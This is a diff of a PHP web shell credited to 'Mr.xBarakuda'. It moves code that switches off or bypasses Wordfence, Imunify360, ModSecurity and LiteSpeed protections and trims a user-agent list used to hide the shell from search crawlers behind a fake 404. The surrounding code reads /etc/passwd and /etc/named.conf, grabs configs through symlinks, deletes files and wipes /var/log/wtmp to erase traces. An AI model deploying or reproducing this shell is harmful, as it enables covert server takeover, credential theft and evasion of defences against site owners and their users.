@@ -14,16 +14,10 @@ set_time_limit(0);
 @ob_clean();
 @header("X-Accel-Buffering: no");
 @header("Content-Encoding: none");
-@http_response_code(403);
 @http_response_code(404);
-@http_response_code(406);
 $katasandi = 'f5b165f0a2778d027ecebd64a2439c8d';
-$color = "#00ff00";
-$default_action = 'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
- $userAgents = array("Googlebot", "Google", "Google Chrome", "Robot", "IExplorer", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+ $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
  if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
   header('HTTP/1.0 404 Not Found');
   exit;
@@ -54,6 +48,37 @@ if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download'
  header('Content-Length: ' . filesize($file));
  readfile($file);
  exit;
+}
+if (function_exists('litespeed_request_headers')) {
+ $headers = litespeed_request_headers();
+ if (isset($headers['X-LSCACHE'])) {
+  header('X-LSCACHE: off');
+ }
+}
+if (defined('WORDFENCE_VERSION')) {
+ define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+ define('WORDFENCE_DISABLE_FILE_MODS', true);
+}
+if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+ $imunifyHeaders = imunify360_request_headers();
+ if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+  header('X-Imunify360-Request: bypass');
+ }
+ if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
+  header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
+ }
+}
+if (function_exists('apache_request_headers')) {
+ $apacheHeaders = apache_request_headers();
+ if (isset($apacheHeaders['X-Mod-Security'])) {
+  header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
+ }
+}
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
+ $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
+ if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
+  header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
+ }
 }
 ?>
 <html>
@@ -222,7 +247,6 @@ padding:14px 8px;
 </head>
 <?php
 // Code by Mr.xBarakuda From All Indonesian Web Shell
-// Bypassed
 if (file_exists('php.ini')) {
 }
 else {
@@ -239,38 +263,6 @@ else {
  fwrite($img1, $sec1);
  fclose($img1);
 }
-if (function_exists('litespeed_request_headers')) {
- $headers = litespeed_request_headers();
- if (isset($headers['X-LSCACHE'])) {
-  header('X-LSCACHE: off');
- }
-}
-if (defined('WORDFENCE_VERSION')) {
- define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
- define('WORDFENCE_DISABLE_FILE_MODS', true);
-}
-if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
- $imunifyHeaders = imunify360_request_headers();
- if (isset($imunifyHeaders['X-Imunify360-Request'])) {
-  header('X-Imunify360-Request: bypass');
- }
- if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
-  header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
- }
-}
-if (function_exists('apache_request_headers')) {
- $apacheHeaders = apache_request_headers();
- if (isset($apacheHeaders['X-Mod-Security'])) {
-  header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
- }
-}
-if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
- $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
- if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
-  header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
- }
-}
-// Close bypass
 function w($dir, $perm) {
  if (!is_writable($dir)) {
   return "<font color=red>" . $perm . "</font>";
@@ -426,11 +418,10 @@ function reverse($url) {
  curl_close($ch);
 }
 if (get_magic_quotes_gpc()) {
- function idx_ss($array) {
-  return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
+ function kdx_gans($array) {
+  return is_array($array) ? array_map('kdx_gans', $array) : stripslashes($array);
  }
- $_POST = idx_ss($_POST);
- $_COOKIE = idx_ss($_COOKIE);
+ $_POST = kdx_gans($_POST);
 }
 $d0mains = @file("/etc/named.conf");
 $users = @file('/etc/passwd');
@@ -524,7 +515,7 @@ else {
  $gid = $gid['gid'];
 }
 echo "<center>";
-echo "<pre class='kedip'>
+echo "<pre onkeydown='return false;' onmousedown='return false;' class='kedip'>
 
   __  __           ____                  _              _       
  |  \/  |         |  _ \                | |            | |      
@@ -550,8 +541,7 @@ echo "Port: <font color=deepskyblue>" . $sport . "</font><br>";
 echo "Time On Server: <font color=deepskyblue>" . date("d-M-Y / h:i a") . "</font><br>";
 echo "Safe Mode: " . $sm . "<br>";
 echo "Disable Functions: " . $ds . "<br>";
-echo "file_get_contents: " . $fget . "<br>";
-echo "magic_quotes_gpc: " . $magico . "<br>";
+echo "file_get_contents: " . $fget . " | magic_quotes_gpc: " . $magico . "<br>";
 echo "MySQL: " . $mysql . " | MsSQL: " . $mssql . " | PostgreSQL: " . $pgsql . " | Perl: " . $perl . " | Python: " . $python . " | Wget: " . $wget . " | cURL: " . $curl . " | Oracle: " . $orac . "<br>";
 echo "CWD: ";
 foreach ($scdir as $c_dir => $cdir) {
@@ -779,7 +769,7 @@ elseif ($_GET['do'] == 'delogs') {
  exe("rm -rf /var/log/wtmp");
  sleep(2);
  echo '<p>Deleting .../var/log/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
- sleep(3);
+ sleep(4);
  echo '<br><p><i>Your Traces Has Been Successfully Deleting ...From the Server</i></p>';
  echo '</center>';
  echo '</table></td></tr>';
@@ -3848,7 +3838,7 @@ elseif ($_GET['do'] == 'shellscan') {
 elseif ($_GET['do'] == 'symconfv2') { ?>
 <center><h3>Symlink Config v2 By Mr.xBarakuda</h3></center>
 <?php
- // Cod3d by Mr.xBarakuda //
+ // Code by Mr.xBarakuda //
  @error_reporting(0);
  @ini_set('html_errors', 0);
  @ini_set('max_execution_time', 0);
@@ -4579,7 +4569,7 @@ elseif ($_GET['act'] == 'newfile') {
   $newfile = htmlspecialchars($_POST['newfile']);
   $fopen = fopen($newfile, "a+");
   if ($fopen) {
-   $act = "<script>alert('DONE!')window.location='?act=edit&dir=" . $dir . "&file=" . $_POST['newfile'] . "';</script>";
+   $act = "<script>alert('DONE!')window.location.href='?act=edit&dir=" . $dir . "&file=" . $_POST['newfile'] . "';</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4598,7 +4588,7 @@ elseif ($_GET['act'] == 'newfolder') {
    $act = "<font color=red>permission denied</font>";
   }
   else {
-   $act = "<script>alert('DONE!')window.location='?dir=" . $dir . "';</script>";
+   $act = "<script>alert('DONE!')window.location.href='?dir=" . $dir . "';</script>";
   }
  }
  echo $act;
@@ -4611,7 +4601,7 @@ elseif ($_GET['act'] == 'rename_dir') {
  if ($_POST['dir_rename']) {
   $dir_rename = rename($dir, "" . dirname($dir) . "/" . htmlspecialchars($_POST['fol_rename']) . "");
   if ($dir_rename) {
-   $act = "<script>alert('DONE!')window.location='?dir=" . dirname($dir) . "';</script>";
+   $act = "<script>alert('DONE!')window.location.href='?dir=" . dirname($dir) . "';</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4629,7 +4619,7 @@ elseif ($_GET['act'] == 'delete_dir') {
    @rmdir($dir);
    @exe("rm -rf $dir");
    @exe("rmdir /s /q $dir");
-   $act = "<script>alert('DONE!')window.location='?dir=" . dirname($dir) . "';</script>";
+   $act = "<script>alert('DONE!')window.location.href='?dir=" . dirname($dir) . "';</script>";
   }
   else {
    $act = "<font color=red>could not remove " . basename($dir) . "</font>";
@@ -4662,7 +4652,7 @@ elseif ($_GET['act'] == 'rename') {
  if ($_POST['do_rename']) {
   $rename = rename($_GET['file'], "$dir/" . htmlspecialchars($_POST['rename']) . "");
   if ($rename) {
-   $act = "<script>window.location='?dir=" . $dir . "';</script>";
+   $act = "<script>alert('DONE!')window.location.href='?dir=" . $dir . "';</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4678,7 +4668,7 @@ elseif ($_GET['act'] == 'rename') {
 elseif ($_GET['act'] == 'delete') {
  $delete = unlink($_GET['file']);
  if ($delete) {
-  $act = "<script>window.location='?dir=" . $dir . "';</script>";
+  $act = "<script>alert('DONE!')window.location.href='?dir=" . $dir . "';</script>";
  }
  else {
   $act = "<font color=red>permission denied</font>";
